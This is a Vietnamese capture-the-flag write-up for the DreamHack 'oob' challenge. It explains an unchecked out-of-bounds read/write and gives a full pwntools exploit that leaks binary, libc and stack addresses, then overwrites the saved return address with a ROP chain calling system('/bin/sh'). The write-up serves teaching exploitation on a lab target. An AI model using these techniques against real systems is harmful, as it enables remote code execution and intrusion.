# oob---Write-up-----DreamHack
Hướng dẫn cách giải bài oob cho anh em mới chơi pwnable.

**Author:** Nguyễn Cao Nhân aka Nhân Sigma

**Category:** Binary Exploitation

**Date:** 18/1/2026

## 1. Mục tiêu cần làm
Xem thử bài này có mấy lớp bảo vệ.

<img width="350" height="201" alt="image" src="https://github.com/user-attachments/assets/34042d2b-62c5-49ba-aee1-691344fb661c" />

Không bất ngờ lắm.

Đầu tiên là đọc code đã

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+Ch] [rbp-14h] BYREF
  __int64 v5[2]; // [rsp+10h] [rbp-10h] BYREF

  v5[1] = __readfsqword(0x28u);
  initialize(argc, argv, envp);
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        menu();
        __isoc99_scanf("%d", &v4);
        if ( v4 != 1 )
          break;
        printf("offset: ");
        __isoc99_scanf("%lld", v5);
        printf("%c\n", (unsigned int)oob[v5[0]]);
      }
      if ( v4 != 2 )
        break;
      printf("offset: ");
      __isoc99_scanf("%lld", v5);
      printf("value: ");
      getchar();
      __isoc99_scanf("%lld", &oob[v5[0]]);
    }
    if ( v4 == 3 )
      break;
    puts("invalid choice");
  }
  return 0;
}
```

Ta thấy nó không khai báo `oob` nhưng lại sử dụng được. Khi double click vào ta thấy nó là biến toàn cục và nằm ở vùng **.data**.

<img width="808" height="40" alt="image" src="https://github.com/user-attachments/assets/12c7b188-dae0-47ed-b839-58d82c554e7c" />

Nó còn được gán sẵn `Hello, World!`. Tiếp đó là nó không hề kiểm tra offset mà ta nhập vào tức là ta có thể chạm vào tới bất kì đâu cũng được, chưa kể ta có thể ghi bất cứ gì vào bất cứ chỗ nào nữa. Bài này full lớp bảo vệ nên ta sẽ sử dụng leak libc và ROPchain.

## 2. Cách thực thi
Đầu tiên là vô gdb để kiểm tra xem `oob` nó nằm ở vị trí nào để tìm offset leak Libc.

<img width="999" height="258" alt="image" src="https://github.com/user-attachments/assets/3c2e0290-6941-47c8-900f-0bbfe21f6f56" />

Ngay đằng sau nó là leak libc, còn đằng trước là binary. Tiện ác, giờ ta leak binary trước để sau này tiện tính offset, sau đó leak libc.

```Python
def leak_8_bytes(offset):
    leaked_addr = 0
    for i in range(8):
        p.sendlineafter(b"> ", b"1")
        p.sendlineafter(b"offset: ", str(offset + i).encode())
        # Đọc đúng 1 ký tự sau khi printf in ra
        byte_val = ord(p.recvn(1)) 
        leaked_addr |= (byte_val << (8 * i))
        # Nhận nốt ký tự xuống dòng dư thừa nếu có
        p.recvline() 
    return leaked_addr

binary_leak = leak_8_bytes(-8)
binary_base = binary_leak - 0x4008
oob_addr = binary_base + 0x4010
log.success(f"OOB address : {hex(oob_addr)}")
```

Cái offset để tìm base và oob các bạn có thể dùng vmmap để tính nha.

<img width="582" height="130" alt="image" src="https://github.com/user-attachments/assets/3415b227-5143-4343-a555-30cc3a4b8d81" />

Tiếp đến là leak libc.

```Python
libc_leak = leak_8_bytes(16)
libc_base = libc_leak - 0x21a780
log.success(f"Libc leak : {hex(libc_leak)}")
log.success(f"Libc base : {hex(libc_base)}")
```

Quên nói các bạn là bài này các bạn phải sử dụng pwninit để patch file này thì mới tìm được offset chuẩn, bên cạnh đó các bạn phải lấy file libc chuẩn nữa.

<img width="1166" height="903" alt="image" src="https://github.com/user-attachments/assets/672c10f4-62e4-4825-a231-4d12e404173f" />

Sau khi có libc thì ta sẽ sử dụng 1 kĩ thuật là leak stack ( tự bịa ). Ta sẽ tìm `environ` và sau đó dùng nó để tìm ra saved RIP để ghi đè ROPchain vào.

```Python
environ_addr = libc_base + libc.sym['environ']
log.success(f"environ address : {hex(environ_addr)}")
offset_to_environ = environ_addr - oob_addr
stack_ptr = leak_8_bytes(offset_to_environ)
log.success(f"stack leak : {hex(stack_ptr)}")
```

Giờ làm sao để tìm được offset từ environ đến saved RIP ? Hãy làm lần lượt các bước sau

<img width="848" height="635" alt="image" src="https://github.com/user-attachments/assets/62e564db-2713-471e-9bec-3a591c7d9dea" />

Vì là file patch nên nó sẽ bị ẩn đi mấy cái hàm như `main`, `start`,... Nhưng không sao, vì `main` luôn nằm ở `f 5` trong backtrack nên cứ thoải mái mà xài.

```Python
rip_addr = stack_ptr - 0x120

offset_to_rip = rip_addr - oob_addr
```

Sau khi đã có đủ rồi thì bắt đầu tạo 1 ROPchain thôi.

```Python
rop = ROP(libc)
pop_rdi = libc_base + 0x2a3e5
system_addr = libc_base + 0x50d60
bin_sh = libc_base + 0x1d8698 
ret_gadget = libc_base + 0x29cd6

log.info(f"Pop RDI: {hex(pop_rdi)}")
log.info(f"Ret (align): {hex(ret_gadget)}")
log.info(f"System: {hex(system_addr)}")
```

Sau đó bắt đầu ghi vào saved RIP

```Python
def write_8_bytes(offset, value):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"offset: ", str(offset))
    p.sendlineafter(b"value: ", str(value))

write_8_bytes(offset_to_rip     ,  ret_gadget)
write_8_bytes(offset_to_rip +  8, pop_rdi)
write_8_bytes(offset_to_rip + 16,  bin_sh)
write_8_bytes(offset_to_rip + 24, system_addr)
```

Cuối cùng là kết thúc chương trình bằng option 3 là xong.

```Python
p.sendlineafter(b"> ", b"3")

p.sendline(b"cat flag")
p.interactive()
```

Bài này khá là dễ. Nó chỉ là **OOB** phiên bản cao cấp hơn tí mà thôi, không phải vấn đề quá khó. Thôi thì hãy cho mình 1 star để có động lực viết tiếp nha 🐧.

## 3.Exploit
```Python
from pwn import *

# p = process('./oob_patched')
p = remote('host8.dreamhack.games', 15832)
libc = ELF('./libc.so.6')

def leak_8_bytes(offset):
    leaked_addr = 0
    for i in range(8):
        p.sendlineafter(b"> ", b"1")
        p.sendlineafter(b"offset: ", str(offset + i).encode())
        # Đọc đúng 1 ký tự sau khi printf in ra
        byte_val = ord(p.recvn(1)) 
        leaked_addr |= (byte_val << (8 * i))
        # Nhận nốt ký tự xuống dòng dư thừa nếu có
        p.recvline() 
    return leaked_addr

def write_8_bytes(offset, value):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"offset: ", str(offset))
    p.sendlineafter(b"value: ", str(value))

binary_leak = leak_8_bytes(-8)
binary_base = binary_leak - 0x4008
oob_addr = binary_base + 0x4010
log.success(f"OOB address : {hex(oob_addr)}")

libc_leak = leak_8_bytes(16)
libc_base = libc_leak - 0x21a780
log.success(f"Libc leak : {hex(libc_leak)}")
log.success(f"Libc base : {hex(libc_base)}")

environ_addr = libc_base + libc.sym['environ']
log.success(f"environ address : {hex(environ_addr)}")
offset_to_environ = environ_addr - oob_addr
stack_ptr = leak_8_bytes(offset_to_environ)
log.success(f"stack leak : {hex(stack_ptr)}")

rip_addr = stack_ptr - 0x120

offset_to_rip = rip_addr - oob_addr

rop = ROP(libc)
pop_rdi = libc_base + 0x2a3e5
system_addr = libc_base + 0x50d60
bin_sh = libc_base + 0x1d8698 
ret_gadget = libc_base + 0x29cd6

log.info(f"Pop RDI: {hex(pop_rdi)}")
log.info(f"Ret (align): {hex(ret_gadget)}")
log.info(f"System: {hex(system_addr)}")

write_8_bytes(offset_to_rip     ,  ret_gadget)
write_8_bytes(offset_to_rip +  8, pop_rdi)
write_8_bytes(offset_to_rip + 16,  bin_sh)
write_8_bytes(offset_to_rip + 24, system_addr)

p.sendlineafter(b"> ", b"3")

p.sendline(b"cat flag")
p.interactive()
```
